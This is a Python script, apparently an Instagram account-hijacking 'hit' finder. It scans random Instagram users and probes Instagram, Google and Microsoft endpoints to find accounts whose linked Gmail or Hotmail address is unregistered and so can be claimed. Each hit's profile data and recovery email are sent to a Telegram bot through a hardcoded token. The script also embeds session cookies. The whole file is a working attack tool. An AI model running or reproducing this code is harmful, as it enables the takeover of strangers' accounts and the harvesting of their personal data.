from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
from urllib.parse import quote

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        
        # Hardcoded credentials
        self.token = '8058556960:AAHdFM9ZyPWyh5SLqJXhozb4cEuFfM-M8qY'
        print('[+] Token loaded')
        
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            pass
        
        self.id = input('[+] Enter ID : ')
        
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            pass
        
        print('[+] Getting Hotmail tokens...')
        retry_count = 0
        max_retries = 5
        
        while retry_count < max_retries:
            try:
                session = requests.Session()
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                }
                
                response = session.get('https://signup.live.com/signup', headers=headers, timeout=15)
                
                # Try to extract canary token
                if '"apiCanary":"' in response.text:
                    canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                else:
                    print(f'[!] Retry {retry_count + 1}/{max_retries}: apiCanary not found in response')
                    retry_count += 1
                    time_module.sleep(2)
                    continue
                
                # Try to get amsc cookie
                if 'amsc' in session.cookies.get_dict():
                    self.amsc = session.cookies.get_dict()['amsc']
                else:
                    print(f'[!] Retry {retry_count + 1}/{max_retries}: amsc cookie not found')
                    retry_count += 1
                    time_module.sleep(2)
                    continue
                
                cookies = {
                    'amsc': self.amsc,
                }
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                }
                json_data = {
                    'clientExperiments': [
                        {
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': [
                                'enableplaintextforsignupexperiment_treatment',
                            ],
                        },
                    ],
                }
                
                response = session.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                    timeout=15
                ).json()
                
                if 'apiCanary' in response:
                    self.canary = response['apiCanary']
                    print('[+] Hotmail tokens obtained successfully!')
                    break
                else:
                    print(f'[!] Retry {retry_count + 1}/{max_retries}: apiCanary not in response')
                    retry_count += 1
                    time_module.sleep(2)
                    
            except Exception as e:
                retry_count += 1
                print(f'[!] Retry {retry_count}/{max_retries}: {str(e)}')
                time_module.sleep(3)
        
        if retry_count >= max_retries:
            print('[!] Failed to get Hotmail tokens after maximum retries')
            print('[!] Continuing with Gmail checks only...')
            self.amsc = None
            self.canary = None
        
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            pass
        
        for _ in range(100):
            Thread(target=self.home).start()
    
    def insta1(self, email):
        while True:
            try:
                csrftoken = md5(str(time()).encode()).hexdigest()
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                    'x-csrftoken': csrftoken,
                }
                data = {
                    'username': email,
                }
                response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data).text
                if 'showAccountRecoveryModal' in response:
                    return True
                else:
                    return False
            except:
                pass
    
    def insta2(self, email):
        while True:
            try:
                url = 'https://b.i.instagram.com/api/v1/accounts/login/'
                headers = {
                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                    'Accept': '*/*',
                    'Cookie': 'missing',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US',
                    'X-IG-Capabilities': '3brTvw==',
                    'X-IG-Connection-Type': 'WIFI',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Host': 'i.instagram.com'
                }
                uid = str(uuid4())
                data = {
                    'uuid': uid,
                    'password': 'ffffdddddaaa666',
                    'username': email,
                    'device_id': uid,
                    'from_reg': 'false',
                    '_csrftoken': 'missing',
                    'login_attempt_countn': '0'
                }
                re = requests.post(url, headers=headers, data=data).text
                if 'bad_password' in re:
                    return True
                else:
                    return False
            except:
                pass
    
    def check_gmail(self, email):
        while True:
            try:
                if '@' in email:
                    email = email.split('@')[0]
                tim = (str(time()).split('.')[0])
                headers = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'cookie': 'HSID=A3TxC-A0yRsCA1dOO; SSID=ARenU9ksEOCIaEO4P; APISID=hnQUEqtNc5vHjhT9/AawmOWOOgkqM5vJze; __Host-GAPS=1:A5k8RauTcQc3xH2K66ARptqQB1AK0KdW5aT-RVZponPE3KiUShdpDjzVOMKscyGbCOTsVTxN6fuwkjWokE8qNLrm6MR4pg:hClD8NNycPp_GmJW;',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-arch': '"x86"',
                    'sec-ch-ua-bitness': '"64"',
                    'sec-ch-ua-full-version': '"124.0.6327.4"',
                    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Linux"',
                    'sec-ch-ua-platform-version': '""',
                    'sec-ch-ua-wow64': '?0',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': generate_user_agent(),
                    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
                    'x-client-data': 'CLrdygE=',
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-goog-ext-391502476-jspb': '["S336499450:1722131730722296"]',
                    'x-same-domain': '1',
                }
                par = {
                    'biz': 'false',
                    'continue': 'https://mail.google.com/mail/mu/mp/580/?login=1',
                    'ddm': '0',
                    'dsh': f'S-{tim}:1722139307145196',
                    'flowEntry': 'SignUp',
                    'flowName': 'GlifWebSignIn',
                }
                re = requests.get(f'https://accounts.google.com/lifecycle/flows/signup?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fmu%2Fmp%2F580%2F%3Flogin%3D1&ddm=0&flowEntry=SignUp&flowName=GlifWebSignIn&dsh=S{tim}%3A1722152876221519', params=par, cookies=None, headers=headers)
                try:
                    tok = re.text.split("3DGlifWebSignIn%26TL%3D")[2].split("','")[0]
                except:
                    tok = ""
                
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AGxDo0eKMHZmgEC_FYSd7DksXn11%3A1722139309078&'
                params = {
                    'TL': tok,
                }
                re = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params,
                    cookies=None,
                    headers=headers,
                    data=data,
                ).text
                if 'signup' in re:
                    return True
                else:
                    return False
            except Exception as e:
                pass
    
    def get_info(self, username, domen):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356',
            }
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
                'ig_sig_key_version': '4',
            }
            try:
                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
                rest = response.json()['email']
            except:
                rest = None
            
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': 'https://www.instagram.com/{}/'.format(username),
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
                'x-ig-app-id': '936619743392459',
                'x-ig-www-claim': '0',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'username': username,
            }
            try:
                response = requests.get(
                    'https://www.instagram.com/api/v1/users/web_profile_info/',
                    params=params,
                    headers=headers,
                ).json()
            except:
                response = None
            
            try:
                id = response['data']['user']['id']
            except:
                id = None
            try:
                followerNum = response['data']['user']['edge_followed_by']['count']
            except:
                followerNum = None
            try:
                followingNum = response['data']['user']['edge_follow']['count']
            except:
                followingNum = None
            try:
                postNum = response['data']['user']['edge_owner_to_timeline_media']['count']
            except:
                postNum = None
            try:
                isPraise = response['data']['user']['is_private']
            except:
                isPraise = None
            try:
                full_name = response['data']['user']['full_name']
            except:
                full_name = None
            try:
                biography = response['data']['user']['biography']
            except:
                biography = None
            try:
                if id == None:
                    date = None
                else:
                    try:
                        date = requests.get('https://mel7n.pythonanywhere.com/?id={}'.format(id)).json()['date']
                    except:
                        date = None
            except:
                date = None
            
            # Create message text
            info = '''⌯ Hi PRIME Got Hit
───────────
followers: {}
following: {}
total posts: {}
isPraise: {}
username: {}
email: {}@{}
date: {}
id: {}
full name: {}
bio: {}
rest: {}
Instagram: https://instagram.com/{}
───────────
by: @m0hsvn'''.format(followerNum, followingNum, postNum, isPraise, username, username, domen, date, id, full_name, biography, rest, username)
            
            print(info)
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n\n')
        except:
            info = '''⌯ Hi PRIME Got Hit
───────────
followers: {}
following: {}
total posts: {}
isPraise: {}
username: {}
email: {}@{}
date: {}
id: {}
full name: {}
bio: {}
rest: {}
Instagram: https://instagram.com/{}
───────────
by: @m0hsvn'''.format(None, None, None, None, username, username, domen, None, None, None, None, None, username)
            
            print(info)
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n\n')
        
        # Send to Telegram with proper URL encoding and error handling
        print(f"\n[*] Attempting to send to Telegram (Chat ID: {self.id})...")
        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Send using POST method with proper JSON data (more reliable)
                url = f'https://api.telegram.org/bot{self.token}/sendMessage'
                payload = {
                    'chat_id': str(self.id),
                    'text': info
                }
                
                print(f"[*] Attempt {attempt + 1}/{max_retries}...")
                response = requests.post(url, json=payload, timeout=10)
                
                print(f"[*] Response status: {response.status_code}")
                print(f"[*] Response text: {response.text}")
                
                if response.status_code == 200:
                    response_json = response.json()
                    if response_json.get('ok'):
                        print(f"[✓] Message sent to Telegram successfully!")
                        return
                    else:
                        print(f"[!] Telegram API returned ok=false: {response.text}")
                else:
                    print(f"[!] Telegram API returned status {response.status_code}: {response.text}")
                    
            except Exception as e:
                print(f"[!] Attempt {attempt + 1} failed to send to Telegram: {str(e)}")
                if attempt < max_retries - 1:
                    time_module.sleep(2)  # Wait before retry
        
        print(f"[✗] Failed to send message to Telegram after {max_retries} attempts")
    
    def check_hotmail(self, email):
        # Skip if tokens weren't obtained
        if self.amsc is None or self.canary is None:
            return False
            
        while True:
            try:
                cookies = {
                    'amsc': self.amsc,
                }
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': self.canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                }
                json_data = {
                    'signInName': email,
                }
                response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies=cookies, headers=headers, json=json_data, timeout=10).text
                if '"isAvailable":true' in response:
                    return True
                else:
                    return False
            except Exception as e:
                return False
    
    def get_username(self):
        while True:
            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Opera";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Opera";v="111.0.5168.61", "Chromium";v="125.0.6422.143", "Not.A/Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"10.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
                    'x-asbd-id': '129477',
                    'x-bloks-version-id': '213c82555f99bb0cecb045c627a22f08209d7a699fc238c7e73a0482e70267f9',
                    'x-csrftoken': 'QOeFYsOi8enKuW80uC0WezhvEgiydc2Y',
                    'x-fb-friendly-name': 'PolarisProfilePageContentDirectQuery',
                    'x-fb-lsd': '3TdmFoJ7r2hQowntSy6Exd',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': 'hmac.AR3iNxyHufbREf9pIUL6m2ciMIIxA3vQTyCHW_yWjgu5dmsq',
                }
                data = {
                    'av': '17841408545457742',
                    '__user': '0',
                    '__a': '1',
                    '__req': '53',
                    'variables': '{"id":"' + str(randrange(1, 402149008)) + '","render_surface":"PROFILE"}',
                    'doc_id': '7663723823674585',
                }
                username = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data).json()['data']['user']['username']
                return [username]
            except Exception as e:
                pass
    
    def home(self):
        while True:
            try:
                sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instagram : {self.good_insgram}\r''')
                sys.stdout.flush()
                
                while True:
                    try:
                        usernames = self.get_username()
                        if usernames == None:
                            pass
                        else:
                            break
                    except:
                        pass
                
                for username in usernames:
                    sys.stdout.write(f'''\rHits : {self.hits} Bad Instagram {self.bad_instgram} Bad Email : {self.bad_email} Good Instagram : {self.good_insgram}\r''')
                    sys.stdout.flush()
                    
                    api1 = choice(['1', '2'])
                    api2 = choice(['1', '2'])
                    email1 = username + '@gmail.com'
                    email2 = username + '@hotmail.com'
                    
                    if '1' == api1:
                        s11 = self.insta1(email1)
                    elif '2' == api1:
                        s11 = self.insta2(email1)
                    else:
                        s11 = False
                    
                    if '1' == api2:
                        s22 = self.insta1(email2)
                    elif '2' == api2:
                        s22 = self.insta2(email2)
                    else:
                        s22 = False
                    
                    if s11 == True:
                        self.good_insgram += 1
                        qq = self.check_gmail(email1)
                        if qq == True:
                            self.hits += 1
                            username_split, domen = email1.split('@')
                            self.get_info(username_split, domen)
                        else:
                            self.bad_email += 1
                    else:
                        self.bad_instgram += 1
                    
                    if s22 == True:
                        self.good_insgram += 1
                        # Only check hotmail if tokens are available
                        if self.amsc is not None and self.canary is not None:
                            qq = self.check_hotmail(email2)
                            if qq == True:
                                self.hits += 1
                                username_split, domen = email2.split('@')
                                self.get_info(username_split, domen)
                            else:
                                self.bad_email += 1
                        else:
                            # Skip hotmail check if tokens unavailable
                            self.bad_email += 1
                    else:
                        self.bad_instgram += 1
            except Exception as e:
                pass

qredes()
